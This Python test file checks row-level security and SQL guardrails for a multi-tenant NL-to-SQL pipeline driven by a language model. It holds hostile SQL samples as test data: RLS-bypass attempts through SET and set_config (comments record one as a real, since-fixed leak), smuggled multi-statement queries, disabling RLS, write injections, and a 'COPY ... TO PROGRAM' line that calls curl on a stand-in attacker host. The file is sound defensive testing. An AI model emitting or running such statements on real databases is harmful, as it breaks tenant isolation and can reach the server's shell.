    monkeypatch.setattr(nl_to_sql, "chat", scripted)
    cfg = {"base_url": "https://mock.invalid/v1", "api_key": "test-key",
           "model": "test-model", "llm_timeout": 10, "query_timeout": 5}
    sql, attempts, note = nl_to_sql.generate_sql(question_with_context, cfg)
    assert sql is not None and attempts == 1
    user_msg = scripted.calls[0][-1]["content"]
    assert "[Workspace context: the active client workspace is" in user_msg
    assert f"'{CO2_NAME}' (company_id = {co2})" in user_msg


# ===========================================================================
# K) Row-level security enforcement proofs via the RESTRICTED ROLE
#    (migrations/002_add_rls.sql applied to the scratch DB by the session
#    fixture). The two-company case is the whole point: RLS must scope the
#    role's view to the GUC's workspace EVEN WHEN THE SQL HAS NO WHERE
#    company_id CLAUSE -- and RLS ANDs with a hostile WHERE.
# ===========================================================================
RLS_CLIENT_TABLES = ("customers", "job_types", "employees", "jobs",
                     "financial_ledger", "labor_logs")
RLS_RAW_MATVIEWS = ("mv_monthly_summary", "mv_customer_profitability",
                    "mv_job_type_profitability", "mv_labor_cost_analysis",
                    "mv_benchmark_comparison")
RLS_SCOPED_VIEWS = ("scoped_monthly_summary", "scoped_customer_profitability",
                    "scoped_job_type_profitability",
                    "scoped_labor_cost_analysis", "scoped_benchmark_comparison")


@pytest.fixture(scope="module")
def rls_role_conn(conn):
    """Module-scoped connection AS nl2sql_reader to the scratch DB, via
    nl_to_sql's production DSN builder (the exact path the AI-SQL executor
    takes). Skips if the role is unreachable."""
    dsn = nl_to_sql._reader_dsn(scratch_database_url())
    try:
        rc = psycopg2.connect(dsn, connect_timeout=5)
        with rc.cursor() as cur:
            cur.execute("SELECT current_user")
            assert cur.fetchone()[0] == "nl2sql_reader"
    except Exception as exc:                    # noqa: BLE001
        pytest.skip(f"nl2sql_reader not reachable on scratch DB: {exc!r}")
    yield rc
    try:
        rc.close()
    except Exception:                           # noqa: BLE001
        pass


def _rls_count(role_conn, sql, guc=None):
    """Run a single-value SELECT as the role, optionally with the
    app.current_company_id GUC set FOR THAT STATEMENT ONLY (SET LOCAL inside
    the query's transaction, then rollback -- the shared module fixture
    connection never leaks a GUC across tests)."""
    try:
        with role_conn.cursor() as cur:
            if guc is not None:
                cur.execute("SET LOCAL app.current_company_id = %s",
                            (str(guc),))
            cur.execute(sql)
            (n,) = cur.fetchone()
        return n
    finally:
        # always end the transaction (also clears SET LOCAL and recovers
        # from expected errors such as the raw-matview permission denials)
        try:
            role_conn.rollback()
        except Exception:                       # noqa: BLE001
            pass


def test_K_role_attributes_and_policies(conn):
    """K1: on the scratch DB the migration created the role with the right
    attributes, the 9 policies, and RLS enabled on the 8 client tables +
    companies."""
    attrs = fetch_one(conn, "SELECT rolsuper, rolcanlogin, rolcreatedb, "
                            "rolcreaterole, rolinherit, rolbypassrls "
                            "FROM pg_roles WHERE rolname = 'nl2sql_reader'")
    assert attrs == (False, True, False, False, False, False), attrs
    (n_policies,) = fetch_one(conn, "SELECT count(*) FROM pg_policy")
    assert n_policies == 9
    names = {r[0] for r in fetch_all(
        conn, "SELECT polname FROM pg_policy")}
    assert {f"tenant_isolation_{t}" for t in RLS_CLIENT_TABLES} <= names
    assert "tenant_isolation_companies" in names
    rls_tables = {r[0] for r in fetch_all(
        conn, "SELECT relname FROM pg_class WHERE relrowsecurity AND "
              "relnamespace = 'public'::regnamespace")}
    assert set(RLS_CLIENT_TABLES) | {"companies"} <= rls_tables


def test_K_grant_matrix_with_negatives(conn):
    """K2: the role's SELECT grants cover the client tables + companies +
    global data + the 5 scoped views, and NEVER the 5 raw matviews
    (has_table_privilege negative checks) nor any write privilege."""
    for rel in RLS_CLIENT_TABLES + ("companies", "market_benchmarks",
                                    "backtest_results") + RLS_SCOPED_VIEWS:
        assert fetch_one(conn, "SELECT has_table_privilege('nl2sql_reader',"
                               " %s, 'SELECT')", (rel,))[0] is True, rel
    for rel in RLS_RAW_MATVIEWS:
        assert fetch_one(conn, "SELECT has_table_privilege('nl2sql_reader',"
                               " %s, 'SELECT')", (rel,))[0] is False, rel
    for rel in ("jobs", "customers"):
        for priv in ("INSERT", "UPDATE", "DELETE"):
            assert fetch_one(
                conn, "SELECT has_table_privilege('nl2sql_reader', %s, %s)",
                (rel, priv))[0] is False, (rel, priv)


def test_K_guc2_sees_only_company2_rows(rls_role_conn):
    """K3 (THE user-demanded test): GUC=co2 and NO WHERE clause -- the role
    sees ONLY company 2's rows in every client table. RLS enforces tenancy
    without the SQL's cooperation."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    for table in RLS_CLIENT_TABLES:
        n_co2 = _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {table}",
                           guc=co2)
        pg_n = fetch_one(_scratch_pg_conn(),
                         f"SELECT COUNT(*) FROM {table}"
                         f" WHERE company_id = %s", (co2,))[0]
        assert n_co2 == pg_n, \
            f"{table}: role with GUC={co2} saw {n_co2} rows, expected {pg_n}"
    # explicit leak check across the row bodies: no QAMT1 marker anywhere,
    # and company-2's tagged data IS visible (customers/job_types names and
    # employees emails carry the QAMT2/qamt2 marker; employee NAMES do not)
    marker_sql = {
        "customers": "SELECT name FROM customers",
        "job_types": "SELECT name FROM job_types",
        "employees": "SELECT email FROM employees",
    }
    for table, sql in marker_sql.items():
        with rls_role_conn.cursor() as cur:
            cur.execute("SET LOCAL app.current_company_id = %s", (str(co2),))
            cur.execute(sql)
            body = "\n".join(str(r[0]) for r in cur.fetchall())
        rls_role_conn.rollback()
        assert "QAMT1" not in body, f"{table}: company-1 data leaked"
        assert "amt2" in body.lower(), f"{table}: company-2 data missing"


def _scratch_pg_conn():
    return psycopg2.connect(scratch_database_url())


def test_K_rls_ands_with_where_clause(rls_role_conn):
    """K4 (RLS ANDs with the caller's WHERE): GUC=co2 + WHERE company_id=1
    returns ZERO rows in every client table -- a hostile or careless query
    cannot escape its workspace, because the policy predicate is ANDed."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    pg_c1 = fetch_one(_scratch_pg_conn(),
                      "SELECT COUNT(*) FROM jobs WHERE company_id = %s",
                      (co1,))[0]
    assert pg_c1 > 0, "fixture must seed company-1 jobs"
    for table in RLS_CLIENT_TABLES:
        with rls_role_conn.cursor() as cur:
            cur.execute("SET LOCAL app.current_company_id = %s", (str(co2),))
            cur.execute(f"SELECT COUNT(*) FROM {table}"
                        " WHERE company_id = %s", (co1,))
            (n,) = cur.fetchone()
        rls_role_conn.rollback()
        assert n == 0, \
            f"{table}: WHERE company_id={co1} under GUC={co2} returned {n}"
    # ...and the total is still co2-only (the GUC predicate filters the rest)
    n_total = _rls_count(rls_role_conn, "SELECT COUNT(*) FROM jobs", guc=co2)
    assert n_total == fetch_one(_scratch_pg_conn(),
                                "SELECT COUNT(*) FROM jobs"
                                " WHERE company_id = %s", (co2,))[0]


def test_K_no_guc_fail_closed(rls_role_conn):
    """K5 (fail-closed): with NO GUC set, the role sees ZERO rows in every
    client table and the companies registry (the policy comparison is NULL
    -> no row passes)."""
    for table in RLS_CLIENT_TABLES + ("companies",):
        n = _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {table}")
        assert n == 0, f"{table}: no-GUC session saw {n} rows (must be 0)"
    # market data is GLOBAL: still fully visible
    n = _rls_count(rls_role_conn, "SELECT COUNT(*) FROM market_benchmarks")
    assert n > 0


def test_K_scoped_views_only_own_rows(rls_role_conn):
    """K6: the scoped_* wrapper views (the AI's only read surface for the
    SMB aggregates) show ONLY the GUC workspace's rows; the RAW matviews are
    permission-denied for the role."""
    co2 = SESSION["co2"]
    for scoped, raw in zip(RLS_SCOPED_VIEWS, RLS_RAW_MATVIEWS):
        n_scoped = _rls_count(rls_role_conn,
                              f"SELECT COUNT(*) FROM {scoped}", guc=co2)
        pg_n = fetch_one(_scratch_pg_conn(),
                         f"SELECT COUNT(*) FROM {raw}"
                         " WHERE company_id = %s", (co2,))[0]
        assert n_scoped == pg_n, \
            f"{scoped}: role saw {n_scoped}, expected {pg_n}"
    for raw in RLS_RAW_MATVIEWS:
        with pytest.raises(psycopg2.errors.InsufficientPrivilege):
            _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {raw}", guc=co2)


def test_K_registry_row_only(rls_role_conn):
    """K7: with the GUC set, the role's view of the companies registry is
    exactly ONE row -- its own workspace (it cannot enumerate clients)."""
    co2 = SESSION["co2"]
    with rls_role_conn.cursor() as cur:
        cur.execute("SET LOCAL app.current_company_id = %s", (str(co2),))
        cur.execute("SELECT company_id, company_name FROM companies")
        rows = cur.fetchall()
    rls_role_conn.rollback()
    assert len(rows) == 1
    assert rows[0][0] == co2 and rows[0][1] == CO2_NAME


def test_K_writes_blocked_via_role(rls_role_conn):
    """K8: UPDATE / DELETE via the role are BLOCKED with ZERO rows changed
    (missing grants; the WITH CHECK policy would block too if a grant
    existed). Verified OUTSIDE the AI executor's read-only transaction, so
    this is the ROLE's denial, not the executor's transaction setting."""
    co2 = SESSION["co2"]
    before_jobs = fetch_one(_scratch_pg_conn(),
                            "SELECT COUNT(*) FROM jobs")[0]
    for stmt in ("UPDATE jobs SET status = 'cancelled'",
                 "DELETE FROM jobs",
                 "INSERT INTO jobs (company_id, job_number, customer_id,"
                 " job_type_id, status, job_date, quoted_price)"
                 " VALUES (%s, 'QA2-HACK', NULL, NULL, 'completed',"
                 " DATE '2026-01-01', 1.00)"):
        with rls_role_conn.cursor() as cur:
            cur.execute("SET LOCAL app.current_company_id = %s", (str(co2),))
            with pytest.raises(psycopg2.Error):
                cur.execute(stmt, (co2,) if "INSERT" in stmt else None)
                cur.fetchall()
        rls_role_conn.rollback()
    assert fetch_one(_scratch_pg_conn(),
                     "SELECT COUNT(*) FROM jobs")[0] == before_jobs


def test_K_run_readonly_query_end_to_end_on_scratch(conn, monkeypatch):
    """K9: the REAL run_readonly_query (no monkeypatching of the executor)
    against the scratch DB: company_id=co2 scopes an UNscoped SQL to
    company-2 rows via RLS; company_id=None fail-closes to zero."""
    real_run = nl_to_sql.run_readonly_query
    res = real_run("SELECT COUNT(*) AS n FROM jobs",
                   company_id=SESSION["co2"], db=scratch_database_url())
    assert "error" not in res, res.get("error")
    assert res["rows"][0][0] == fetch_one(
        conn, "SELECT COUNT(*) FROM jobs WHERE company_id = %s",
        (SESSION["co2"],))[0]
    res = real_run("SELECT COUNT(*) AS n FROM jobs",
                   company_id=None, db=scratch_database_url())
    assert "error" not in res and res["rows"][0][0] == 0
    res = real_run("SELECT COUNT(*) AS n FROM jobs WHERE company_id = 1",
                   company_id=SESSION["co2"], db=scratch_database_url())
    assert "error" not in res and res["rows"][0][0] == 0   # RLS ANDs


# ===========================================================================
# K10-K17: RLS-round isolation & QA audit additions. Everything below runs
# through a REAL nl2sql_reader session (password auth over TCP, via
# nl_to_sql._reader_dsn) against the two-company scratch DB -- never the
# superuser connection -- except the superuser-side "oracle" counts the
# role results are checked against. None of these probes ever writes.
# ===========================================================================

# Every relation the demanded proof runs over: the 8 client tables, the
# companies registry AND the 5 scoped_* wrapper views (all carry company_id).
RLS_PROOF_RELATIONS = (
    CLIENT_TABLES + ("companies",) + RLS_SCOPED_VIEWS
)

# What a restricted session can read WITHOUT any GUC: exactly the GLOBAL
# market/market-audit data. Existence-guarded (the SoCal Capital / SEC peer
# module tables live in their own schema files and may be absent from a
# minimal DB built from schema.sql + analytics_views.sql alone).
RLS_GLOBAL_VISIBLE = (
    "market_benchmarks", "backtest_results", "mv_socal_rate_guidance",
    "regional_industry_profiles", "socal_wage_benchmarks",
    "socal_macro_indicators", "socal_business_patterns",
    "socal_loan_activity", "socal_harvest_log",
    "socal_capital_events", "socal_county_capital_summary",
    "public_peer_financials", "mv_vertical_financial_quartiles",
)


def _rls_select_all(role_conn, sql, guc=None):
    """Run one SELECT as the role, optionally with the GUC set FOR THAT
    STATEMENT ONLY (SET LOCAL inside the statement's transaction); returns
    (columns, rows) and ALWAYS rolls back, so the shared module fixture
    connection never leaks a GUC or an aborted txn across tests."""
    try:
        with role_conn.cursor() as cur:
            if guc is not None:
                cur.execute("SET LOCAL app.current_company_id = %s",
                            (str(guc),))
            cur.execute(sql)
            cols = ([d.name for d in cur.description]
                    if cur.description else [])
            rows = cur.fetchall() if cur.description else []
        return cols, rows
    finally:
        try:
            role_conn.rollback()
        except Exception:                       # noqa: BLE001
            pass


def _scratch_counts(rel):
    """Superuser-side oracle: (co1_rows, co2_rows) of `rel`. Scoped views
    are counted through their RAW matview -- the scoped view's own baked-in
    GUC predicate would make the GUC-less superuser connection see zero
    rows (fail-closed applies to superusers too)."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    if rel.startswith("scoped_"):
        rel = "mv_" + rel[len("scoped_"):]
    return fetch_one(
        _scratch_pg_conn(),
        f"SELECT COUNT(*) FILTER (WHERE company_id = %s),"
        f"       COUNT(*) FILTER (WHERE company_id = %s) FROM {rel}",
        (co1, co2))


@pytest.mark.parametrize("rel", RLS_PROOF_RELATIONS)
def test_K10_demanded_proof_bare_select_scopes_to_guc(rls_role_conn, rel):
    """K10 (THE DEMANDED PROOF, parametrized per relation over the 8 client
    tables + companies registry + 5 scoped views): a BARE `SELECT * FROM
    <rel>` with NO WHERE clause returns ONLY the GUC workspace's rows --
    in BOTH directions (GUC=co1 sees zero co2 rows, GUC=co2 sees zero co1
    rows), the count matches the superuser oracle exactly, a hostile
    `WHERE company_id = <other>` from the other workspace's session returns
    0 (RLS ANDs), and a no-GUC session returns 0 (fail-closed). Tenancy is
    enforced by the DATABASE, without any cooperation from the SQL."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    for guc, other in ((co2, co1), (co1, co2)):
        n_self, n_other = _scratch_counts(rel)
        (n_self, n_other) = ((n_other, n_self) if guc == co2
                             else (n_self, n_other))
        cols, rows = _rls_select_all(rls_role_conn,
                                     f"SELECT * FROM {rel}", guc=guc)
        ci = cols.index("company_id")
        assert len(rows) == n_self, (
            f"{rel} under GUC={guc}: saw {len(rows)} rows, the superuser "
            f"oracle says {n_self}")
        assert all(r[ci] == guc for r in rows), (
            f"{rel} under GUC={guc}: cross-tenant rows leaked "
            f"{sorted({r[ci] for r in rows} - {guc})[:5]}")
        # hostile WHERE for the OTHER workspace: exactly zero rows
        with rls_role_conn.cursor() as cur:
            cur.execute("SET LOCAL app.current_company_id = %s", (str(guc),))
            cur.execute(f"SELECT COUNT(*) FROM {rel} WHERE company_id = %s",
                        (other,))
            (n_cross,) = cur.fetchone()
        rls_role_conn.rollback()
        assert n_cross == 0, (
            f"{rel}: WHERE company_id={other} under GUC={guc} returned "
            f"{n_cross} rows (RLS must AND with the caller's WHERE)")
    # fail-closed: no GUC at all -> zero rows
    _, rows = _rls_select_all(rls_role_conn, f"SELECT * FROM {rel}")
    assert rows == [], f"{rel}: a no-GUC session saw {len(rows)} rows"


def test_K11_adversarial_leak_battery(rls_role_conn):
    """K11: explicit leak attempts from a GUC=co2 session must return ZERO
    company-1 rows: an equality predicate for the other id, an IN() that
    covers both ids, a catch-all predicate (customer_id > 0) over
    company-1-only data, a UNION of both companies' id queries, and a
    subquery fed by WHERE company_id=<other> (RLS applies to subqueries
    too). Verified on row bodies with the QAMT1 marker as well."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    sup = _scratch_pg_conn()
    sup.autocommit = True    # oracle connection: reads only, no txn management
    co2_job_ids = {r[0] for r in fetch_all(
        sup, "SELECT id FROM jobs WHERE company_id = %s", (co2,))}

    # 1) equality for the other workspace: strictly ZERO rows, every table
    for rel in CLIENT_TABLES:
        _, rows = _rls_select_all(
            rls_role_conn, f"SELECT id FROM {rel} WHERE company_id = {co1}",
            guc=co2)
        assert rows == [], f"{rel}: WHERE company_id={co1} leaked {rows[:5]}"

    # 2) IN (both ids): only own-company rows may come back
    for rel in CLIENT_TABLES:
        _, rows = _rls_select_all(
            rls_role_conn,
            f"SELECT company_id FROM {rel}"
            f" WHERE company_id IN ({co1}, {co2})", guc=co2)
        assert {r[0] for r in rows} <= {co2}, (
            f"{rel}: IN ({co1},{co2}) leaked company ids "
            f"{sorted({r[0] for r in rows} - {co2})}")

    # 3) catch-all predicate over jobs (customer_id > 0 matches every row):
    #    zero company-1 job ids, and no QAMT1 marker in any returned cell
    cols, rows = _rls_select_all(
        rls_role_conn,
        "SELECT id, job_number, company_id FROM jobs WHERE customer_id > 0",
        guc=co2)
    assert {r[0] for r in rows} <= co2_job_ids
    assert {r[2] for r in rows} <= {co2}
    assert "QAMT1" not in rows_to_text(rows)
    # ...and the same catch-all over financial_ledger
    _, rows = _rls_select_all(
        rls_role_conn,
        "SELECT company_id FROM financial_ledger WHERE customer_id > 0",
        guc=co2)
    assert {r[0] for r in rows} <= {co2}

    # 4) UNION of both companies' id queries: the co1 branch must
    #    contribute NOTHING (rows == co2's own ids only)
    _, rows = _rls_select_all(
        rls_role_conn,
        f"SELECT id FROM jobs WHERE company_id = {co1}"
        f" UNION SELECT id FROM jobs WHERE company_id = {co2}", guc=co2)
    assert rows, "co2 must have its own jobs (fixture)"
    assert {r[0] for r in rows} <= co2_job_ids, (
        "UNION leaked company-1 job ids")

    # 5) subquery fed by the hostile predicate: the INNER query is
    #    RLS-filtered too, so the outer IN() matches nothing
    _, rows = _rls_select_all(
        rls_role_conn,
        f"SELECT id, name FROM customers WHERE company_id IN"
        f" (SELECT company_id FROM jobs WHERE company_id = {co1})",
        guc=co2)
    assert rows == [], (
        f"subquery leak attempt returned {len(rows)} rows: {rows[:5]}")


@pytest.mark.parametrize("rel", RLS_PROOF_RELATIONS)
def test_K12_no_guc_fresh_session_zero_rows(rls_role_conn, rel):
    """K12 (parametrized fail-closed sweep): a fresh session with NO
    app.current_company_id GUC sees ZERO rows in every client table, the
    companies registry and every scoped_* view (NULLIF(''/unset) -> NULL ->
    no row passes)."""
    _, rows = _rls_select_all(rls_role_conn, f"SELECT * FROM {rel}")
    assert rows == [], f"{rel}: no-GUC session saw {len(rows)} rows"


def test_K13_guc_garbage_string_clean_cast_error(rls_role_conn):
    """K13a (pinned exact behavior): GUC='abc' does NOT silently widen or
    silently empty the session -- the policy's ::bigint cast fails with a
    CLEAN PostgreSQL error (SQLSTATE 22P02 InvalidTextRepresentation)."""
    with pytest.raises(psycopg2.errors.InvalidTextRepresentation) as ei:
        _rls_count(rls_role_conn, "SELECT COUNT(*) FROM jobs", guc="abc")
    assert ei.value.pgcode == "22P02"
    assert "invalid input syntax for type bigint" in str(ei.value)


def test_K13_guc_empty_string_fail_closed(rls_role_conn):
    """K13b: GUC='' (empty string) -> NULLIF(...,'') -> NULL -> ZERO rows in
    every proof relation (the documented fail-closed semantics)."""
    for rel in RLS_PROOF_RELATIONS:
        n = _rls_count(rls_role_conn, f"SELECT COUNT(*) FROM {rel}", guc="")
        assert n == 0, f"{rel}: empty GUC saw {n} rows"


def test_K13_guc_bigint_overflow_clean_cast_error(rls_role_conn):
    """K13c (pinned exact behavior): a numeric GUC that overflows bigint
    fails the policy cast with SQLSTATE 22003 (NumericValueOutOfRange) --
    again fail-closed with a clean PostgreSQL error, never silent rows."""
    with pytest.raises(psycopg2.errors.NumericValueOutOfRange) as ei:
        _rls_count(rls_role_conn, "SELECT COUNT(*) FROM jobs",
                   guc="9" * 23)
    assert ei.value.pgcode == "22003"
    assert "out of range for type bigint" in str(ei.value)


def test_K13_guc_session_set_cannot_outlive_rollback(rls_role_conn):
    """K13d: a session-level `SET app.current_company_id` scopes the reads
    INSIDE its transaction, but a ROLLBACK (or a new connection, which is
    what run_readonly_query uses) wipes it -- the role is fail-closed
    again."""
    co2 = SESSION["co2"]
    (expected,) = fetch_one(_scratch_pg_conn(),
                            "SELECT COUNT(*) FROM jobs"
                            " WHERE company_id = %s", (co2,))
    with rls_role_conn.cursor() as cur:
        cur.execute("SET app.current_company_id = %s", (str(co2),))
        cur.execute("SELECT COUNT(*) FROM jobs")
        (in_txn,) = cur.fetchone()
    rls_role_conn.rollback()
    with rls_role_conn.cursor() as cur:
        cur.execute("SELECT COUNT(*) FROM jobs")
        (after,) = cur.fetchone()
    rls_role_conn.rollback()
    assert in_txn == expected > 0, (in_txn, expected)
    assert after == 0, "the session SET must not survive the rollback"


def test_K13_guc_reset_restores_fail_closed(rls_role_conn):
    """K13e: RESET app.current_company_id returns the session to its
    fail-closed default (custom-GUC default is the empty string -> NULLIF
    -> NULL -> zero rows)."""
    co2 = SESSION["co2"]
    with rls_role_conn.cursor() as cur:
        cur.execute("SET LOCAL app.current_company_id = %s", (str(co2),))
        cur.execute("SELECT COUNT(*) FROM jobs")
        (set_n,) = cur.fetchone()
        cur.execute("RESET app.current_company_id")
        cur.execute("SELECT COUNT(*) FROM jobs")
        (reset_n,) = cur.fetchone()
    rls_role_conn.rollback()
    assert set_n > 0, "GUC=co2 must show co2's rows"
    assert reset_n == 0, "after RESET the session must be fail-closed again"


def test_K13_set_local_inside_readonly_txn_still_enforced(rls_role_conn):
    """K13f: run_readonly_query's exact shape -- SET LOCAL GUC inside a
    READ-ONLY transaction, then SELECT -- is still fully RLS-enforced
    (read-only transactions do not weaken row-level security)."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    (expected,) = fetch_one(_scratch_pg_conn(),
                            "SELECT COUNT(*) FROM jobs"
                            " WHERE company_id = %s", (co2,))
    rls_role_conn.set_session(readonly=True, autocommit=False)
    try:
        with rls_role_conn.cursor() as cur:
            cur.execute("SET LOCAL app.current_company_id = %s", (str(co2),))
            cur.execute("SELECT COUNT(*) FROM jobs")
            (n,) = cur.fetchone()
            cur.execute("SELECT COUNT(*) FROM jobs WHERE company_id = %s",
                        (co1,))
            (cross,) = cur.fetchone()
    finally:
        rls_role_conn.rollback()
        rls_role_conn.set_session(readonly=False, autocommit=False)
    assert n == expected > 0, (n, expected)
    assert cross == 0, \
        "even inside a read-only txn the co1 WHERE returns 0"


# --- the AI-vector bypass battery -------------------------------------------
# (hostile SQL an LLM could emit; the PIPELINE (ask -> generate_sql ->
# validate_sql) must reject every one BEFORE any statement reaches the
# database. The DB-level fate of each, if it somehow reached
# run_readonly_query directly, is pinned in K14b/K16 -- honestly.)
AI_VECTOR_BYPASS_ATTEMPTS = (
    ("SET app.current_company_id = '1'", "forbidden keyword: set"),
    ("WITH sneak AS (INSERT INTO jobs (company_id, job_number)"
     " VALUES (1, 'QAMT-HACK') RETURNING 1) SELECT * FROM sneak",
     "forbidden keyword: insert"),
    ("SELECT * FROM mv_monthly_summary",
     "relation not allowed: mv_monthly_summary"),
    ("COPY (SELECT company_id FROM jobs) TO PROGRAM 'curl evil.example'",
     "forbidden keyword: copy"),
    ("SELECT table_name FROM information_schema.tables",
     "relation not allowed: information_schema.tables"),
    ("SELECT 1; SET app.current_company_id = '1'", "multi-statement"),
    ("UPDATE jobs SET company_id = 1", "forbidden keyword: update"),
    ("DELETE FROM jobs", "forbidden keyword: delete"),
    ("GRANT SELECT ON jobs TO PUBLIC", "forbidden keyword: grant"),
    ("CREATE TABLE x AS SELECT 1", "forbidden keyword: create"),
    ("SELECT * FROM jobs FOR UPDATE", "forbidden keyword: update"),
    ("ALTER TABLE jobs DISABLE ROW LEVEL SECURITY", "forbidden keyword: alter"),
    # set_config is the ONE SELECT-callable GUC writer; a CTE body runs
    # BEFORE the main scan, so "WITH flipped AS (SELECT set_config(...))
    # SELECT ... FROM jobs" used to re-scope RLS to another workspace
    # mid-query -- the proven (and now fixed) leak this pin guards.
    ("WITH flipped AS (SELECT set_config('app.current_company_id', '1',"
     " false)) SELECT j.id FROM jobs j, flipped f",
     "forbidden keyword: set_config"),
    ("SELECT set_config('app.current_company_id', '1', false)",
     "forbidden keyword: set_config"),
)


@pytest.mark.parametrize("sql, expect", AI_VECTOR_BYPASS_ATTEMPTS,
                         ids=[a[0][:38] for a in AI_VECTOR_BYPASS_ATTEMPTS])
def test_K14_ai_vector_bypass_never_executes(conn, monkeypatch, sql, expect):
    """K14a: every AI-vector bypass attempt through the REAL pipeline entry
    point (ask() -> generate_sql -> validate_sql -> run_readonly_query) is
    rejected by the parser BEFORE execution: sql is None, the note carries
    the exact guardrail verdict, zero rows, and NOTHING ran (the scripted
    chat would have produced these statements; the pipeline refused them).
    The same applies to hand-edited SQL -- app.py re-runs validate_sql on
    whatever finally runs."""
    scripted = _ScriptedChat([sql, sql])   # same hostile SQL for both attempts
    monkeypatch.setattr(nl_to_sql, "chat", scripted)
    cfg = {"base_url": "https://mock.invalid/v1", "api_key": "test-key",
           "model": "test-model", "llm_timeout": 10, "query_timeout": 5}
    res = nl_to_sql.ask("show me everything", cfg, company_id=SESSION["co2"])
    assert res["sql"] is None, res
    assert res["rows"] == [] and res["rowcount"] == 0
    assert expect in res["note"], res["note"]
    assert res["error"] == res["note"]
    assert len(scripted.calls) == 2        # the one documented repair retry


@pytest.mark.parametrize("sql, expect_error, expect_rows", [
    ("SET app.current_company_id = '1'", None, 0),          # harmless no-op,
    # rolled back with the transaction (0 rows); the executor uses a FRESH
    # connection per query so a lone SET cannot even affect its own SELECT,
    # let alone the next query.
    ("SELECT 1; SET app.current_company_id = '1'", "multi-statement", 0),
    ("SET app.current_company_id = '1'; SELECT company_id, job_number"
     " FROM jobs", "multi-statement", 0),
    ("WITH flipped AS (SELECT set_config('app.current_company_id', '1',"
     " false)) SELECT j.id, j.company_id FROM jobs j, flipped f",
     "forbidden keyword: set_config", 0),
    ("WITH x AS (INSERT INTO jobs (company_id) VALUES (1) RETURNING 1)"
     " SELECT * FROM x", "blocked: the connection is read-only", 0),
    ("SELECT 1 INTO scratch_probe_t", "blocked: the connection is read-only",
     0),
    ("COPY (SELECT 1) TO PROGRAM 'echo hi'", "permission denied: the AI", 0),
    ("SELECT COUNT(*) FROM mv_monthly_summary",
     "permission denied: the AI", 0),
])
def test_K14b_executor_db_level_fates(sql, expect_error, expect_rows):
    """K14b (honest DB-level backstop pins): what each bypass attempt does
    IF it somehow reached run_readonly_query directly (bypassing the
    parser). The executor's own tenant-GUC backstop rejects the two
    override vectors BEFORE any connection is opened:
      * "SET app.current_company_id = '1'; SELECT ..." -- pre-fix this
        EXECUTED both statements via the simple query protocol and
        RETURNED THE OTHER WORKSPACE'S ROWS (the smuggled SET overrode the
        executor's SET LOCAL before the smuggled read); now
        "multi-statement", rejected without touching the DB;
      * the CTE-body set_config flip -- the same override in a single
        statement (the parser fix's executor-side mirror); now
        "forbidden keyword: set_config".
    The remaining layers hold as before: writes are read-only-blocked,
    shell/command escapes are privilege-denied, and anything that DOES
    execute is rolled back with the transaction and returns zero rows.
    (information_schema is pinned separately in K17: its metadata is
    visible to a direct executor call -- parser layer 1 is the guard
    there, and it carries no tenant data.)"""
    res = nl_to_sql.run_readonly_query(sql, query_timeout=5,
                                       company_id=SESSION["co2"],
                                       db=scratch_database_url())
    if expect_error is None:
        assert res.get("error") is None, res.get("error")
    else:
        assert res.get("error", "") == expect_error \
            or res.get("error", "").startswith(expect_error), \
            res.get("error")
    assert res["rowcount"] == expect_rows
    assert res["rows"] == []


def test_K14c_information_schema_join_still_rls_filtered(rls_role_conn):
    """K14c: even THROUGH an information_schema join (which the parser
    rejects but which PostgreSQL would allow at the privilege level), the
    joined client table stays RLS-filtered: zero tenant rows without a
    GUC, exactly the GUC workspace's rows with one."""
    co2 = SESSION["co2"]
    (expected,) = fetch_one(_scratch_pg_conn(),
                            "SELECT COUNT(*) FROM jobs"
                            " WHERE company_id = %s", (co2,))
    _, rows = _rls_select_all(
        rls_role_conn,
        "SELECT j.id FROM jobs j"
        " JOIN information_schema.tables t ON t.table_name = 'jobs'")
    assert rows == [], "no-GUC join leaked tenant rows"
    _, rows = _rls_select_all(
        rls_role_conn,
        "SELECT j.id FROM jobs j"
        " JOIN information_schema.tables t ON t.table_name = 'jobs'",
        guc=co2)
    assert {r[0] for r in rows} <= set(
        r[0] for r in fetch_all(_scratch_pg_conn(),
                                "SELECT id FROM jobs WHERE company_id = %s",
                                (co2,)))
    assert len(rows) == expected > 0, (len(rows), expected)


def test_K15_write_layer_forensics(rls_role_conn):
    """K15 (which defense layer fires, in order):
      1. OUTSIDE a read-only txn the role's missing grants fire FIRST:
         UPDATE/DELETE/INSERT -> 42501 'permission denied for table jobs'.
      2. INSIDE the executor's read-only txn the transaction layer fires
         FIRST: 25006 'cannot execute UPDATE in a read-only transaction'.
      3. RLS WITH CHECK is the LAST line: with the grants DELIBERATELY
         widened on this scratch DB, a cross-tenant company_id hijack
         still fails with 42501 'new row violates row-level security
         policy', a hostile DELETE sees zero matching rows (USING), while
         a self-scoped UPDATE would be allowed (documented semantics) --
         everything runs in a transaction that is rolled back, and the
         grants are revoked again, so the scratch DB is untouched."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    sup = _scratch_pg_conn()
    sup.autocommit = True    # oracle connection (reads + the grant juggling)
    (jobs_total,) = fetch_one(sup, "SELECT COUNT(*) FROM jobs")
    (co2_jobs,) = fetch_one(sup, "SELECT COUNT(*) FROM jobs"
                                 " WHERE company_id = %s", (co2,))

    # layer 1: plain role session (read-WRITE txn) -> grants fire
    for stmt in (f"UPDATE jobs SET status = 'hacked' WHERE company_id = {co2}",
                 f"DELETE FROM jobs WHERE company_id = {co2}",
                 f"INSERT INTO jobs (company_id, job_number, customer_id,"
                 f" job_type_id, status, job_date, quoted_price)"
                 f" VALUES ({co2}, 'QAMT-HACK', NULL, NULL, 'completed',"
                 f" DATE '2026-01-01', 1.00)"):
        with pytest.raises(psycopg2.errors.InsufficientPrivilege) as ei:
            with rls_role_conn.cursor() as cur:
                cur.execute("SET LOCAL app.current_company_id = %s",
                            (str(co2),))
                cur.execute(stmt)
                cur.fetchall()
        rls_role_conn.rollback()
        assert ei.value.pgcode == "42501"
        assert "permission denied for table jobs" in str(ei.value)
    assert fetch_one(sup, "SELECT COUNT(*) FROM jobs")[0] == jobs_total

